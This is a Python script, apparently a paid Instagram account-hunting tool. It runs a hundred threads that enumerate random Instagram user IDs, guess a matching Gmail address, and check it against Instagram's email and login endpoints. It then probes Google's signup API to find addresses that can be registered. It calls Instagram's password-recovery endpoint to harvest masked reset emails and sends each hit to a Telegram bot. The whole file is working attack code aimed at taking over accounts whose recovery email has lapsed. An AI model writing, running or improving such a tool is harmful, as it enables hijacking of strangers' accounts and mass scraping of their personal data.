import os
import sys
import re
import requests
import shutil
from time import time, sleep
from datetime import datetime, timedelta, timezone
from hashlib import md5
from random import choice as cc, randrange as rr
from requests import get, post as pp
from cfonts import render
from user_agent import generate_user_agent as gg

E       = '\033[1;32m'
G       = '\033[1;36m'
Z       = '\033[1;31m'
Q       = '\033[1;36m'
X       = '\033[1;33m'
Z1      = '\033[2;31m'
F       = '\033[2;32m'
A       = '\033[2;34m'
C       = '\033[2;35m'
B       = '\x1b[38;5;208m'
Y       = '\033[1;34m'
M       = '\x1b[1;37m'
S       = '\033[1;33m'
U       = '\x1b[1;37m'
RESET = "\033[0m"
WHITE = "\033[97m"
YELLOW_BG = "\033[1;35m"
BRed    = '\x1b[1;31m'
BGreen  = '\x1b[1;32m'
BPurple  = "\033[1;35m"   
BYellow = '\x1b[1;33m'
R       = '\x1b[1;34m'
BCyan   = '\x1b[1;36m'
BWhite  = '\x1b[1;37m'
BLUE, RESET, BOLD, YELLOW, RED, GREEN, CYAN, MAGENTA = (
    '\033[94m', '\033[0m', '\033[1m', '\033[93m',
    '\033[91m', '\033[92m', '\033[96m', '\033[95m'
)

terminal_width = shutil.get_terminal_size().columns

aman_ascii = r"""
░█████╗░███╗░░░███╗░█████╗░███╗░░██╗
██╔══██╗████╗░████║██╔══██╗████╗░██║
███████║██╔████╔██║███████║██╔██╗██║
██╔══██║██║╚██╔╝██║██╔══██║██║╚████║
██║░░██║██║░╚═╝░██║██║░░██║██║░╚███║
╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
"""

lines = aman_ascii.splitlines()
aman_lines = []

for line in lines:
    centered_line = line.center(terminal_width)
    aman_lines.append(f"{YELLOW_BG}{BRed}{centered_line}{RESET}")

print("\n".join(aman_lines))

IST_OFFSET = timedelta(hours=5, minutes=30)
def check_telegram_access(user_id):
    try:
        url = "https://raw.githubusercontent.com/aman-sw062/file-access/main/free-expire"
        response = requests.get(url)
        if response.status_code == 200:
            lines = response.text.strip().splitlines()
            for line in lines:
                if "," in line and ":" in line:
                    parts = line.strip().split(",")
                    uid = parts[0].strip()
                    date_part = parts[1].strip()
                    try:
                        expiry_ist = datetime.strptime(date_part, "%Y-%m-%d : %H:%M")
                    except ValueError:
                        print(f"⚠️ Invalid date format for user ID {uid}. Skipping.")
                        continue
                    if uid == str(user_id):
                        
                        now_ist = datetime.now(timezone.utc) + IST_OFFSET
                        remaining = expiry_ist - now_ist.replace(tzinfo=None)
                        if remaining.total_seconds() > 0:
                            days, seconds = divmod(int(remaining.total_seconds()), 86400)
                            hours, seconds = divmod(seconds, 3600)
                            minutes, _ = divmod(seconds, 60)
                            print(f"✅ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐆𝐑𝐀𝐍𝐓𝐄𝐃")
                            print(f"⏳ 𝐓𝐢𝐦𝐞 𝐥𝐞𝐟𝐭: {days} days, {hours} hours, {minutes} minutes")
                            return True
                        else:
                            print("⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃: 𝐘𝐨𝐮𝐫 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝.")
                            return False
            print("⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃: 𝐘𝐨𝐮'𝐫𝐞 𝐍𝐨𝐭 𝐏𝐫𝐞𝐦𝐢𝐮𝐦")
            return False
        else:
            print("⚠️ Failed to fetch the user list.")
            return False
    except Exception as e:
        print(f"⚠️ Error while checking access: {e}")
        return False

hit_dustu = kotu_insta = orta_mail = 0
print("")
token = input(f" BOT TOKEN : ")
ID = input(f" ID: ")
if not check_telegram_access(ID.strip()):
    exit()
    
year_menu = f"""
 Select year to hunt (2017, 2018 and 2019 recommended) :
1 »  2011  
2 »  2012 
3 »  2013  
4 »  2014  
5 »  2015  
6 »  2016  
7 »  2017  
8 »  2018   
9 »  2019 
0 »  2011 - 2023   
"""
print(year_menu)

selected_year = input(f" » Select from 0 to 9 : ")

if selected_year == '1':
    min_id, max_id = 10000, 17699999
elif selected_year == '2':
    min_id, max_id = 17699999, 263014407
elif selected_year == '3':
    min_id, max_id = 263014407, 361365133
elif selected_year == '4':
    min_id, max_id = 361365133, 1629010000
elif selected_year == '5':
    min_id, max_id = 1629010000, 2500000000
elif selected_year == '6':
    min_id, max_id = 2500000000, 3713668786
elif selected_year == '7':
    min_id, max_id = 3713668786, 5699785217
elif selected_year == '8':
    min_id, max_id = 5699785217, 8597939245
elif selected_year == '9':
    min_id, max_id = 8597939245, 21254029834
elif selected_year == '0':
    min_id, max_id = 10000, 21254029834
else:
    exit()

print("")
min_followers = int(input(f"{CYAN}Enter minimum followers (10-35 is recommended) : {BWhite}"))

yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
def tll():
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    he3={"accept":"*/*","accept-language":"ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6","content-type":"application/x-www-form-urlencoded;charset=UTF-8","google-accounts-xsrf":"1","sec-ch-ua":"\"Not)A;Brand\";v=\"24\",\"Chromium\";v=\"116\"","sec-ch-ua-arch":"\"\"","sec-ch-ua-bitness":"\"\"","sec-ch-ua-full-version":"\"116.0.5845.72\"","sec-ch-ua-full-version-list":"\"Not)A;Brand\";v=\"24.0.0.0\",\"Chromium\";v=\"116.0.5845.72\"","sec-ch-ua-mobile":"?1","sec-ch-ua-model":"\"ANY-LX2\"","sec-ch-ua-platform":"\"Android\"","sec-ch-ua-platform-version":"\"13.0.0\"","sec-ch-ua-wow64":"?0","sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"same-origin","x-chrome-connected":"source=Chrome,eligible_for_consistency=true","x-client-data":"CJjbygE=","x-same-domain":"1","Referrer-Policy":"strict-origin-when-cross-origin","user-agent":str(gg())}
    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp','user-agent':gg()}
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:os.remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    print(e)
    tll()
tll()

def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,'user-agent':gg()}
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)

def rest(user):
    try:
        headers={'X-Pigeon-Session-Id':'50cc6861-7036-43b4-802e-fb4282799c60','X-Pigeon-Rawclienttime':'1700251574.982','X-IG-Connection-Speed':'-1kbps','X-IG-Bandwidth-Speed-KBPS':'-1.000','X-IG-Bandwidth-TotalBytes-B':'0','X-IG-Bandwidth-TotalTime-MS':'0','X-Bloks-Version-Id':'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0','X-IG-Connection-Type':'WIFI','X-IG-Capabilities':'3brTvw==','X-IG-App-ID':'567067343352427','User-Agent':'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)','Accept-Language':'en-GB,en-US','Cookie':'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP;csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type':'application/x-www-form-urlencoded;charset=UTF-8','Accept-Encoding':'gzip,deflate','Host':'i.instagram.com','X-FB-HTTP-Engine':'Liger','Connection':'keep-alive','Content-Length':'356'}
        data = {
            'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{user}","guid":"{user}","device_id":"{user}","query":"{user}"}}',
            'ig_sig_key_version': '4',
        }
        response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).json()
        r = response.get('email', ' h ')
    except Exception as e:
        r = f' h '
    return r
    
def shelby_info(username, jj):
    global hit_dustu
    hit_dustu += 1
    try:
        urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={username}'
        he = {
            'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
            'x-ig-app-id': '936619743392459',
        }
        re = requests.get(urlg, headers=he).json()
        user_data = re.get('data', {}).get('user', {})

        biography = user_data.get('biography', 'N/A')
        follower_count = user_data.get('edge_followed_by', {}).get('count', 0)
        following_count = user_data.get('edge_follow', {}).get('count', 0)
        user_id = user_data.get('id', 'N/A')
        full_name = user_data.get('full_name', 'N/A')
        is_private = user_data.get('is_private', 'N/A')
        post_count = user_data.get('edge_owner_to_timeline_media', {}).get('count', 0)

        if follower_count and post_count:
            if follower_count >= 50 and post_count >= 15:
                meta = 'business'
            elif follower_count >= 30 and post_count >= 5:
                meta = True
            elif follower_count >= 10 and post_count >= 2:
                meta = True
            else:
                meta = False
        else:
            meta = False

        try:
            date_response = requests.get(f"https://o7aa.pythonanywhere.com/?id={user_id}")
            date = date_response.json().get('date', 'No date available')
        except:
            date = 'N/A'

        reset_email = rest(username)
        porno = f'''
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Name         : {full_name}
Username     : @{username}
Email        : {username}@gmail.com
Followers    : {follower_count}
Following    : {following_count}
Posts        : {post_count}
Private      : {is_private}
Reset Email  : {reset_email}
Meta         : {meta}
Link         : https://www.instagram.com/{username}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Developer    : @hackxpy
'''

        print(porno)
        with open('paid-anonymous.txt', 'a') as ff:
            ff.write(f'{porno}\n')

        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={porno}")
        except:
            pass
    except:
        pass

def amanpy(email):
  global orta_mail
  try:

    if 'good' == check_gmail(email):
        username,jj=email.split('@')
        shelby_info(username,jj)
    else:orta_mail+=1
  except:''
   
def seks(email):
  global kotu_insta,hit_dustu
  try:
    csrftoken = md5(str(time()).encode()).hexdigest()
    ua=generate_user_agent()
    pp=choice('00')
    os.system('clear' if os.name == 'posix' else 'cls')
    
    if pp == '0':
      headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded','origin':'https://www.instagram.com','referer':'https://www.instagram.com/accounts/signup/email/','user-agent':ua,'x-csrftoken':csrftoken}
      data = {
        'email': email,
    }
      response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
      if 'email_is_taken' in str(response.text):amanpy(email)
      else:kotu_insta+=1
    elif pp == '1':
      headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded','origin':'https://www.instagram.com','referer':'https://www.instagram.com/?lang=en-US&hl=en-gb','user-agent':ua,'x-csrftoken':csrftoken}
      data = {
          'username': email,
      }
      response = requests.post(
          'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
          headers=headers,
          data=data,
      ).text
      if '"user":true' in response:amanpy(email)
      else:kotu_insta+=1
  except:''
  os.system('clear' if os.name == 'posix' else 'cls')
  print(f'''
ʜɪᴛ : { hit_dustu}
ʙᴀᴅ ɪɢ : {kotu_insta}
ɢᴏᴏᴅ ᴍᴀɪʟ : {orta_mail}

@hackxpy
''')

import requests
from random import choice, randrange
from threading import Thread
from user_agent import generate_user_agent


def ayr_takipc(username, follower_count):
    if follower_count >= 40:  
        pass
        

def amanpython():
    while True:
        try:
            lsd = ''.join(choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
            id=str(randrange (min_id, max_id)) 
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/0s9s/',
                'user-agent': str(generate_user_agent()),
                'x-fb-lsd': 'amanpy' + lsd,
            }
            data = {
                'lsd': 'amanpy' + lsd,
                'variables': f'{{"id":"{id}","relay_header":false,"render_surface":"PROFILE"}}',
                'doc_id': '7397388303713986',
            }
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            response_json = response.json()          
            user_data = response_json.get('data', {}).get('user', {})
            username = user_data.get('username', 'unknown')
            follower_count = user_data.get('follower_count', 0)    
            if follower_count >= min_followers:
                ayr_takipc(username, follower_count)
                email = username + '@gmail.com'
                seks(email)
        except Exception as e:       
            continue
threads = []
for _ in range(100):  
    t = Thread(target=amanpython)
    t.start()
    threads.append(t)
for t in threads:
    t.join()
